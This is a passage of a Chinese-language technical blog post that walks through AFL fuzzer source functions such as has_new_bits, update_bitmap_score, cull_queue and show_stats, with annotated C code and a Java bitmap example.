class="number">5</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">6</span>] &amp;&amp; vir[<span class="number">6</span>] == <span class="number">0xff</span>) || (cur[<span class="number">7</span>] &amp;&amp; vir[<span class="number">7</span>] == <span class="number">0xff</span>)) ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>)) ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 这个操作通常用于更新位图（bitmaps）。在上下文中，`virgin` 和 `current` 可能表示某些执行路径中的状态信息，通过将新的执行路径状态与之前的状态进行位与操作，可以确定是否有新的位被设置为 1，从而判断是否有新的路径被探索</span></span><br><span class="line">      *virgin &amp;= ~*current;</span><br><span class="line">    &#125;</span><br><span class="line">    current++;</span><br><span class="line">    virgin++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果发现了新位并且更新的是全局的&quot;virgin_bits&quot;，则设置&quot;bitmap_changed&quot;标志为1</span></span><br><span class="line">  <span class="keyword">if</span> (ret &amp;&amp; virgin_map == virgin_bits) bitmap_changed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当前bitmap中的位在&quot;virgin_map&quot;中已经全部被清除，表示没有新的位被发现。在这种情况下，代码不执行遍历，直接返回ret为0。</span></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>检查有没有新路径或者某个路径的执行次数有所不同。</li>
<li>初始化current和virgin为trace_bits和virgin_map的u64首元素地址，设置ret的值为0</li>
<li>8个字节一组，每次从trace_bits，也就是共享内存里取出8个字节</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-   如果current不为0，且`current &amp; virgin`不为0，即代表current发现了新路径或者某条路径的执行次数和之前有所不同</span><br><span class="line">  -   如果ret当前小于2</span><br><span class="line">    -   取current的首字节地址为cur，virgin的首字节地址为vir</span><br><span class="line">    -   i的范围是0-7，比较`cur[i] &amp;&amp; vir[i] == 0xff`，如果有一个为真，则设置ret为2</span><br><span class="line">      -   这代表发现了之前没有出现过的tuple</span><br><span class="line">      -   **注意==的优先级比&amp;&amp;要高，所以先判断vir[i]是否是0xff，即之前从未被覆盖到，然后再和cur[i]进行逻辑与**</span><br><span class="line">    -   否则设置ret为1</span><br><span class="line">        -   这代表仅仅只是改变了某个tuple的hit-count</span><br><span class="line">  -   `*virgin &amp;= ~*current`</span><br><span class="line">-   current和virgin移动到下一组8个字节，直到MAPSIZE全被遍历完。</span><br></pre></td></tr></table></figure>

<ul>
<li>如果传入给has_new_bits的参数<code>virgin_map</code>是<code>virgin_bits</code>,且ret不为0，就设置<strong>bitmap_changed为1</strong><ul>
<li>virgin_bits保存还没有被Fuzz覆盖到的byte，其初始值每位全被置位1,然后每次按字节置位。</li>
</ul>
</li>
<li>返回ret的值</li>
<li>这里可以优化</li>
</ul>
<h4 id="update-bitmap-score-struct-queue-entry-q"><a href="#update-bitmap-score-struct-queue-entry-q" class="headerlink" title="update_bitmap_score(struct queue_entry *q)"></a>update_bitmap_score(struct queue_entry *q)</h4><ul>
<li>这段代码用于更新路径的评分，以便确定哪些路径是更有利于模糊测试的。在进行模糊测试时，通常希望尽可能选择一些路径，这些路径可以触发目标程序的不同位，从而更好地发现漏洞。为此，这段代码维护了一个 <code>top_rated</code> 数组，用于存储每个字节的顶级路径（评分最高的路径）<ul>
<li>每当我们发现一个新的路径，都会调用这个函数来判断其是不是更加地<code>favorable</code>，这个favorable的意思是说是否包含最小的路径集合来遍历到所有bitmap中的位，我们专注于这些集合而忽略其他的。<ul>
<li>首先计算出这个case的 <code>fav_factor</code>，计算方法是<code>q-&gt;exec_us * q-&gt;len</code>即<strong>执行时间和样例大小的乘积</strong>，以这两个指标来衡量权重。</li>
<li>遍历<code>trace_bits</code>数组，如果该字节的值不为0，则代表这是已经被覆盖到的path</li>
<li>然后检查对应于这个path的<code>top_rated</code>是否存在<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-   `static struct queue_entry *top_rated[MAP_SIZE]; /* Top entries for bitmap bytes */`</span><br></pre></td></tr></table></figure></li>
<li>如果存在，就比较<code>fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len</code>，即比较执行<strong>时间和样例大小的乘积，哪个更小</strong>。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-   如果`top_rated[i]`的更小，则代表`top_rated[i]`的更优，不做任何处理continue，继续遍历下一个path。</span><br><span class="line">-   如果q更小，就将`top_rated[i]`原先对应的queue entry的tc_ref字段减一，并将其trace_mini字段置为空。</span><br><span class="line">  -   `u8 *trace_mini; /* Trace bytes, if kept */`</span><br><span class="line">  -   `u32 tc_ref; /* Trace bytes ref count */`</span><br></pre></td></tr></table></figure></li>
<li>然后设置<code>top_rated[i]</code>为<code>q</code>，即当前case，然后将其tc_ref的值加一</li>
<li>如果<code>q-&gt;trace_mini</code>为空，则将trace_bits经过<code>minimize_bits</code>压缩，然后存到trace_mini字段里 [[#void minimize_bits(u8 *dst, u8 *src)]] <strong>BitMap数据压缩 trace_bits</strong></li>
<li>设置 <code>score_changed</code> 为1</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="void-minimize-bits-u8-dst-u8-src"><a href="#void-minimize-bits-u8-dst-u8-src" class="headerlink" title="void minimize_bits(u8 *dst, u8 *src)"></a>void minimize_bits(u8 *dst, u8 *src)</h4><ul>
<li>将trace_bits压缩为较小的位图。 BitMap数据压缩 trace_bits</li>
<li>简单的理解就是把原本是包括了是否覆盖到和覆盖了多少次的byte，<strong>压缩成是否覆盖到的bit。</strong></li>
<li>在看这个函数和下一个函数cull_queue之前，建议把<a href="https://blog.csdn.net/lxlmycsdnfree/article/details/78926359">经典算法系列之(一) - BitMap [数据的压缩存储]</a>读完。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Index</span>(N)代表N的索引号，<span class="built_in">Position</span>(N)代表N的所在的位置号</span><br><span class="line"><span class="built_in">Index</span>(N) = N/<span class="number">8</span> = N &gt;&gt; <span class="number">3</span>;</span><br><span class="line"><span class="built_in">Position</span>(N) = N%<span class="number">8</span> = N &amp; <span class="number">0x07</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="type">int</span> num)</span><br><span class="line"></span><br><span class="line">package com.chs.alg.bitmap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BitMap</span> &#123;</span><br><span class="line">    <span class="comment">//保存数据的</span></span><br><span class="line">    <span class="keyword">private</span> byte[] bits;</span><br><span class="line">    <span class="comment">//能够存储多少数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BitMap</span><span class="params">(<span class="type">int</span> capacity)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//1bit能存储8个数据，那么capacity数据需要多少个bit呢，capacity/8+1,右移3位相当于除以8</span></span><br><span class="line">        bits = <span class="keyword">new</span> byte[(capacity &gt;&gt;<span class="number">3</span> )+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> num)</span></span>&#123;               <span class="comment">// 0x111</span></span><br><span class="line">        <span class="comment">// num/8得到byte[]的index</span></span><br><span class="line">        <span class="type">int</span> arrayIndex = num &gt;&gt; <span class="number">3</span>;          <span class="comment">// 0x22</span></span><br><span class="line">        <span class="comment">// num%8得到在byte[index]的位置</span></span><br><span class="line">        <span class="type">int</span> position = num &amp; <span class="number">0x07</span>;          <span class="comment">// 0x1</span></span><br><span class="line">        <span class="comment">// 将1左移position后，那个位置自然就是1，然后和以前的数据做|，这样那个位置就替换成1了。</span></span><br><span class="line">        bits[arrayIndex] |= <span class="number">1</span> &lt;&lt; position;  <span class="comment">// bits[0x22] |= 1 &lt;&lt; 1;   bits[0x22] |= 2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 还原  (0x22&lt;&lt;3) + (2&gt;&gt;1) = 0x111</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> boolean <span class="title">contain</span><span class="params">(<span class="type">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="comment">// num/8得到byte[]的index</span></span><br><span class="line">        <span class="type">int</span> arrayIndex = num &gt;&gt; <span class="number">3</span>; </span><br><span class="line">        <span class="comment">// num%8得到在byte[index]的位置</span></span><br><span class="line">        <span class="type">int</span> position = num &amp; <span class="number">0x07</span>; </span><br><span class="line">        <span class="comment">// 将1左移position后，那个位置自然就是1，然后和以前的数据做&amp;，判断是否为0即可</span></span><br><span class="line">        <span class="keyword">return</span> (bits[arrayIndex] &amp; (<span class="number">1</span> &lt;&lt; position)) !=<span class="number">0</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">clear</span><span class="params">(<span class="type">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="comment">// num/8得到byte[]的index</span></span><br><span class="line">        <span class="type">int</span> arrayIndex = num &gt;&gt; <span class="number">3</span>; </span><br><span class="line">        <span class="comment">// num%8得到在byte[index]的位置</span></span><br><span class="line">        <span class="type">int</span> position = num &amp; <span class="number">0x07</span>; </span><br><span class="line">        <span class="comment">// 将1左移position后，那个位置自然就是1，然后对取反，再与当前值做&amp;，即可清除当前的位置了.</span></span><br><span class="line">        bits[arrayIndex] &amp;= ~(<span class="number">1</span> &lt;&lt; position); </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BitMap bitmap = <span class="keyword">new</span> <span class="built_in">BitMap</span>(<span class="number">100</span>);</span><br><span class="line">        bitmap.<span class="built_in">add</span>(<span class="number">7</span>);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">&quot;插入7成功&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        boolean isexsit = bitmap.<span class="built_in">contain</span>(<span class="number">7</span>);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">&quot;7是否存在:&quot;</span>+isexsit);</span><br><span class="line">        </span><br><span class="line">        bitmap.<span class="built_in">clear</span>(<span class="number">7</span>);</span><br><span class="line">        isexsit = bitmap.<span class="built_in">contain</span>(<span class="number">7</span>);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">&quot;7是否存在:&quot;</span>+isexsit);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">       <span class="keyword">if</span> (!q-&gt;trace_mini) &#123;</span><br><span class="line">         q-&gt;trace_mini = <span class="built_in">ck_alloc</span>(MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">         <span class="built_in">minimize_bits</span>(q-&gt;trace_mini, trace_bits);</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">minimize_bits</span><span class="params">(u8 *dst, u8 *src)</span> </span>&#123;  </span><br><span class="line">    u32 i = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">while</span> (i &lt; MAP_SIZE) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (*(src++)) dst[i &gt;&gt; <span class="number">3</span>] |= <span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>);  </span><br><span class="line">        i++;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="void-check-map-coverage-void"><a href="#void-check-map-coverage-void" class="headerlink" title="void check_map_coverage(void)"></a>void check_map_coverage(void)</h4><ul>
<li>此函数主要用于在模糊测试开始时检查覆盖率地图的覆盖情况。它采用两个步骤：</li>
</ul>
<ol>
<li>如果覆盖的字节数小于100，就认为覆盖不足，直接返回。这是一个简单的阈值，<strong>如果模糊测试的初始覆盖率太低，可能意味着测试效果不佳</strong>。</li>
<li>遍历从 <code>1 &lt;&lt; (MAP_SIZE_POW2 - 1)</code> 到 <code>MAP_SIZE</code> 范围内的字节。如果在这个范围内的任何一个字节的 <code>trace_bits</code> 不为零，表示至少有一个路径经过了这个位置，覆盖率已经存在。如果没有，那么发出警告，建议重新编译二进制文件以改善覆盖率。</li>
</ol>
<ul>
<li>总之，这段代码用于判断模糊测试初始时覆盖率地图的情况，以便根据情况提出警告或建议。</li>
</ul>
<h4 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The second part of the mechanism discussed above is a routine that</span></span><br><span class="line"><span class="comment">   goes over top_rated[] entries, and then sequentially grabs winners for</span></span><br><span class="line"><span class="comment">   previously-unseen bytes (temp_v) and marks them as favored, at least</span></span><br><span class="line"><span class="comment">   until the next run. The favored entries are given more air time during</span></span><br><span class="line"><span class="comment">   all fuzzing steps. */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">cull_queue</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* q;</span><br><span class="line">  <span class="type">static</span> u8 temp_v[MAP_SIZE &gt;&gt; <span class="number">3</span>];</span><br><span class="line">  u32 i;</span><br><span class="line">  <span class="keyword">if</span> (dumb_mode || !score_changed) <span class="keyword">return</span>;</span><br><span class="line">  score_changed = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(temp_v, <span class="number">255</span>, MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  queued_favored  = <span class="number">0</span>;</span><br><span class="line">  pending_favored = <span class="number">0</span>;</span><br><span class="line">  q = queue;</span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    q-&gt;favored = <span class="number">0</span>;</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Let&#x27;s see if anything in the bitmap isn&#x27;t captured in temp_v.</span></span><br><span class="line"><span class="comment">     If yes, and if it has a top_rated[] contender, let&#x27;s use it. */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">    <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;</span><br><span class="line">      u32 j = MAP_SIZE &gt;&gt; <span class="number">3</span>;</span><br><span class="line">      <span class="comment">/* Remove all bits belonging to the current entry from temp_v. */</span></span><br><span class="line">      <span class="keyword">while</span> (j--) </span><br><span class="line">        <span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])</span><br><span class="line">          temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br><span class="line">      <span class="comment">// 比如这里算 j=8084  i=45299   top_rated[i]-&gt;trace_mini[j]=@  0x40</span></span><br><span class="line">      <span class="comment">// ~top_rated[i]-&gt;trace_mini[j]= -65  = hex(0xff-0x40) = 0xbf</span></span><br><span class="line">      top_rated[i]-&gt;favored = <span class="number">1</span>;</span><br><span class="line">      queued_favored++;</span><br><span class="line">      <span class="keyword">if</span> (!top_rated[i]-&gt;was_fuzzed) pending_favored++;</span><br><span class="line">    &#125;</span><br><span class="line">  q = queue;</span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    <span class="built_in">mark_as_redundant</span>(q, !q-&gt;favored);</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>该函数的目标是在模糊测试期间调整队列，以便更多地探索未被完全探索的路径。这在实际的模糊测试中非常有用，因为它<strong>可以帮助集中资源在最有希望的路径上，提高测试的效率</strong>。函数的具体步骤包括：</li>
<li>精简队列<ul>
<li>如果score_changed为0，即top_rated没有变化，或者 dumb_mode ,就直接返回</li>
<li>设置score_changed的值为0</li>
<li>创建u8 temp_v数组，大小为<code>MAP_SIZE/8</code>，并将其初始值设置为0xff，其每位如果为1就代表还没有被覆盖到，如果为0就代表以及被覆盖到了。</li>
<li>设置queued_favored为0，<code>pending_favored</code>为0</li>
<li>开始遍历queue队列，设置其favored的值都为0</li>
<li>将i从0到MAP_SIZE迭代，这个迭代其实就是筛选出一组queue entry，它们就能够覆盖到所有现在已经覆盖到的路径，而且这个case集合里的case要更小更快，这并不是最优算法，只能算是贪婪算法。<ul>
<li>这又是个不好懂的位运算，<code>temp_v[i &gt;&gt; 3] &amp; (1 &lt;&lt; (i &amp; 7))</code>与上面的差不多，中间的或运算改成了与，是为了检查该位是不是0，即判断该path对应的bit有没有被置位。</li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)  </span><br><span class="line">    <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;  </span><br><span class="line">...  </span><br></pre></td></tr></table></figure>

<ul>
<li>如果<code>top_rated[i]</code>有值，且该path在temp_v里被置位<ul>
<li>就从temp_v中清除掉所有<code>top_rated[i]</code>覆盖到的path，将对应的bit置为0</li>
<li>设置<code>top_rated[i]-&gt;favored</code>为1，queued_favored计数器加一</li>
<li>如果<code>top_rated[i]</code>的was_fuzzed字段是0，代表其还没有fuzz过，则将pending_favored计数器加一</li>
</ul>
</li>
<li>遍历queue队列</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-   `mark_as_redundant(q, !q-&gt;favored)`</span><br><span class="line">    - `/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/queue/.state/redundant_edges/xxx`</span><br><span class="line">  -   也就是说，如果不是favored的case，就被标记成`redundant_edges`</span><br><span class="line">  - [[#mark_as_redundant(struct queue_entry *q, u8 state)]]</span><br></pre></td></tr></table></figure>

<h4 id="mark-as-redundant-struct-queue-entry-q-u8-state"><a href="#mark-as-redundant-struct-queue-entry-q-u8-state" class="headerlink" title="mark_as_redundant(struct queue_entry *q, u8 state)"></a>mark_as_redundant(struct queue_entry *q, u8 state)</h4><ul>
<li>该函数用于标记&#x2F;取消标记队列中的项目为冗余（仅涉及边缘）。主要步骤包括：<ol>
<li>如果新状态与项目之前的状态相同，则直接返回，没有任何操作。</li>
<li>更新项目的冗余状态。</li>
<li>从项目的文件名中获取最后一个 ‘&#x2F;‘ 后的部分，这部分将用于构建冗余文件的路径。</li>
<li>如果新状态为 1，表示要将项目标记为冗余，则进行下面的操作：<ul>
<li>创建一个新文件，并设置文件权限为 0600。</li>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/queue/.state/redundant_edges/xxx</code></li>
</ul>
</li>
<li>如果新状态为 0，表示要取消项目的冗余标记，则进行下面的操作：<ul>
<li>删除之前创建的冗余文件。</li>
</ul>
</li>
<li>释放为构建文件路径而分配的内存。</li>
</ol>
</li>
</ul>
<h4 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h4><ul>
<li>在处理输入目录的末尾显示统计信息，以及一堆警告,以及几个硬编码的常量。<ul>
<li>这段代码用于在处理输入目录后显示初始化统计信息和一些警告</li>
</ul>
</li>
</ul>
<h4 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h4><ul>
<li>resume模式下有意义，其目的是在恢复模式下寻找一个合适的队列起始位置。这个功能只有在进行恢复且能找到原始的 <code>fuzzer_stats</code> 文件时才有意义。</li>
<li>resume时,请尝试查找要从其开始的队列位置,这仅在resume时以及当我们可以找到原始的fuzzer_stats时才有意义.<ul>
<li>如果不是<code>resuming_fuzz</code>，就直接返回</li>
<li>如果是<code>in_place_resume</code>,就打开<code>out_dir/fuzzer_stats</code>文件，否则打开<code>in_dir/../fuzzer_stats</code>文件</li>
<li>读这个文件的内容到<code>tmp[4096]</code>中，找到<code>cur_path</code>，并设置为ret的值，如果大于<code>queued_paths</code>就设置ret为0，返回ret</li>
</ul>
</li>
</ul>
<h4 id="void-write-stats-file-double-bitmap-cvg-double-stability-double-eps"><a href="#void-write-stats-file-double-bitmap-cvg-double-stability-double-eps" class="headerlink" title="void write_stats_file(double bitmap_cvg, double stability, double eps)"></a>void write_stats_file(double bitmap_cvg, double stability, double eps)</h4><ul>
<li><p>更新用于无人值守监控的统计文件</p>
</li>
<li><p>函数负责将各项统计信息写入名为 <code>fuzzer_stats</code> 的文件中，这些信息用于监控 fuzzer 的性能和状态。这可以帮助用户了解 fuzzer 的执行情况、性能和资源使用情况。</p>
<ul>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/fuzzer_stats</code></li>
</ul>
</li>
<li><p>fuzzer_stats</p>
<ul>
<li>创建文件<code>out_dir/fuzzer_stats</code></li>
<li>写入统计信息</li>
<li>start_time<ul>
<li>fuzz运行的开始时间，start_time &#x2F; 1000</li>
</ul>
</li>
<li>last_update<ul>
<li>当前时间</li>
</ul>
</li>
<li>fuzzer_pid<ul>
<li>获取当前pid</li>
</ul>
</li>
<li>cycles_done<ul>
<li><code>queue_cycle</code>在<code>queue_cur</code>为空，即执行到当前队列尾的时候才增加1，所以这代表queue队列被完全变异一次的次数。</li>
</ul>
</li>
<li>execs_done<ul>
<li>total_execs，target的总的执行次数，每次<code>run_target</code>的时候会增加1</li>
</ul>
</li>
<li>execs_per_sec<ul>
<li>每秒执行的次数</li>
</ul>
</li>
<li>paths_total<ul>
<li>queued_paths在每次<code>add_to_queue</code>的时候会增加1，代表queue里的样例总数</li>
</ul>
</li>
<li>paths_favored<ul>
<li>queued_favored，有价值的路径总数</li>
</ul>
</li>
<li>paths_found<ul>
<li>queued_discovered在每次<code>common_fuzz_stuff</code>去执行一次fuzz时，发现新的interesting case的时候会增加1，代表在fuzz运行期间发现的新queue entry。</li>
</ul>
</li>
<li>paths_imported<ul>
<li>queued_imported是master-slave模式下，如果sync过来的case是interesting的，就增加1</li>
</ul>
</li>
<li>max_depth<ul>
<li>最大路径深度</li>
</ul>
</li>
<li>cur_path<ul>
<li>current_entry一般情况下代表的是正在执行的queue entry的整数ID,queue首节点的ID是0</li>
</ul>
</li>
<li>pending_favs<ul>
<li>pending_favored 等待fuzz的favored paths数</li>
</ul>
</li>
<li>pending_total<ul>
<li>pending_not_fuzzed 在queue中等待fuzz的case数</li>
</ul>
</li>
<li>variable_paths<ul>
<li>queued_variable在<code>calibrate_case</code>去评估一个新的test case的时候，如果发现这个case的路径是可变的，则将这个计数器加一，代表发现了一个可变case</li>
</ul>
</li>
<li>stability</li>
<li>bitmap_cvg</li>
<li>unique_crashes<ul>
<li>unique_crashes这是在<code>save_if_interesting</code>时，如果fault是FAULT_CRASH，就将unique_crashes计数器加一</li>
</ul>
</li>
<li>unique_hangs<ul>
<li>unique_hangs这是在<code>save_if_interesting</code>时，如果fault是FAULT_TMOUT，且exec_tmout小于hang_tmout，就以hang_tmout为超时时间再执行一次，如果还超时，就让hang计数器加一。</li>
</ul>
</li>
<li>last_path<ul>
<li>在<code>add_to_queue</code>里将一个新case加入queue时，就设置一次last_path_time为当前时间，<code>last_path_time / 1000</code></li>
</ul>
</li>
<li>last_crash<ul>
<li>同上，在unique_crashes加一的时候，last_crash也更新时间，<code>last_crash_time / 1000</code></li>
</ul>
</li>
<li>last_hang<ul>
<li>同上，在unique_hangs加一的时候，last_hang也更新时间，<code>last_hang_time / 1000</code></li>
</ul>
</li>
<li>execs_since_crash<ul>
<li>total_execs - last_crash_execs,这里last_crash_execs是在上一次crash的时候的总计执行了多少次</li>
</ul>
</li>
<li>exec_tmout<ul>
<li>配置好的超时时间，有三种可能的配置方式，见上文</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h4><ul>
<li>目的是将用于自动筛选的额外测试用例保存到磁盘中。</li>
<li>保存自动生成的extras<ul>
<li>如果auto_changed为0，则直接返回</li>
<li>如果不为0，就设置为0，然后创建名为<code>alloc_printf(&quot;%s/queue/.state/auto_extras/auto_%06u&quot;, out_dir, i);</code>的文件，并写入a_extras的内容。</li>
</ul>
</li>
</ul>
<h3 id="Fuzz执行"><a href="#Fuzz执行" class="headerlink" title="Fuzz执行"></a>Fuzz执行</h3><h4 id="fuzz-主要流程"><a href="#fuzz-主要流程" class="headerlink" title="fuzz-主要流程"></a>fuzz-主要流程</h4><ul>
<li>进入while循环<ul>
<li>[[#cull_queue]] 该函数的目标是在模糊测试期间调整队列，以便更多地探索未被完全探索的路径</li>
<li>[[#show_stats]] 在终端上显示有关Fuzzer状态和统计信息的用户界面</li>
<li>如果在一轮执行之后的queue里的case数，和执行之前一样，代表在完整的一轮执行里都没有发现任何一个新的case<ul>
<li>如果<code>use_splicing为1</code>，就设置cycles_wo_finds计数器加1</li>
<li>否则，设置<code>use_splicing为1</code>，代表我们接下来要通过splice重组queue里的case。</li>
</ul>
</li>
<li>设置-M -S &amp;&amp; 宏<code>AFL_IMPORT_FIRST</code> 去从其他fuzzer中导入test cases <code>sync_fuzzers</code> [[#sync_fuzzers(char **argv)]]<ul>
<li>这段代码用于从其他模糊测试器中获取有趣的测试案例并执行</li>
<li><code>/home/wutang/Desktop/fuzz_test/fuzz_output/</code></li>
<li>感觉没必要</li>
</ul>
</li>
<li><code>skipped_fuzz = fuzz_one(use_argv);</code> [[#fuzz_one]]</li>
</ul>
</li>
</ul>
<h4 id="show-stats"><a href="#show-stats" class="headerlink" title="show_stats"></a>show_stats</h4><ul>
<li>该函数用于在终端上显示有关Fuzzer状态和统计信息的用户界面。这个界面是一个详细的终端输出，显示有关Fuzzer执行进度、发现路径数量、执行速度、覆盖率等的信息。<ol>
<li>获取当前时间，并检查是否已经足够时间过去以进行下一次界面更新，如果没有则返回。</li>
<li><code>cur_ms - last_ms &lt; 1000 / UI_TARGET_HZ(5)</code></li>
<li>检查是否已经运行了超过10分钟，如果是则将变量 <code>run_over10m</code> 设置为1</li>
<li>计算平滑的执行速度统计信息。如果是第一次调用该函数，直接计算执行速度。否则，计算当前的执行速度并进行平滑处理，以避免突然的速度变化。</li>
<li>更新时间和执行次数的记录，用于下一次函数调用时计算速度。</li>
<li><code>last_ms</code> <code>last_execs</code></li>
<li>根据平均执行速度计算多久需要调用一次 <code>stats_update</code> 函数以更新状态。</li>
<li>计算位图统计信息，包括非255字节的数量、比特位密度等。</li>
<li><code>t_bytes = count_non_255_bytes(virgin_bits)</code>  这段代码用于计算在位图（bitmap）中设置为非 255（0xFF）的字节数。它主要用于状态屏幕，大约每秒钟调用几次</li>
<li>每隔一分钟，更新模糊器的状态、保存自动 tokens 和写入位图。</li>
<li><code>write_stats_file(t_byte_ratio, stab_ratio, avg_exec)</code></li>
<li><code>save_auto()</code></li>
<li><code>write_bitmap();</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. `/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/fuzz_bitmap`</span><br></pre></td></tr></table></figure></li>
<li>每隔一段时间，更新绘图数据。</li>
<li><code>maybe_update_plot_file(t_byte_ratio, avg_exec);</code> 更新 <code>/home/wutang/Desktop/fuzz_test/fuzz_output/fuzzer1/plot_data</code></li>
<li>根据条件设置 <code>stop_soon</code> 变量，用于控制 Fuzzer 的退出。</li>
<li>如果终端不可用，直接返回。</li>
<li>计算位图的比特位统计信息。 <code>count_bits(virgin_bits)</code></li>
<li>计算给定位图中设置的位数（即置为1的位数），主要用于状态屏幕，每秒钟多次调用，不必要求非常高的速度</li>
<li>清除屏幕并显示 Fuzzer 的横幅信息，其中包括 Fuzzer 的名称、版本号等。</li>
<li>绘制统计信息表格，包括运行时间、路径数量、独特崩溃数量等。</li>
<li>绘制运行阶段进展信息，包括当前阶段、运行的执行次数等。</li>
<li>绘制策略和路径几何信息，包括位翻转、字节翻转、算术操作等。</li>
<li>显示CPU利用率信息，根据实际情况使用不同颜色显示。</li>
</ol>
</li>
</ul>
<h4 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h4><ul>
<li>all<ul>
<li>设置ret_val&#x3D;1</li>
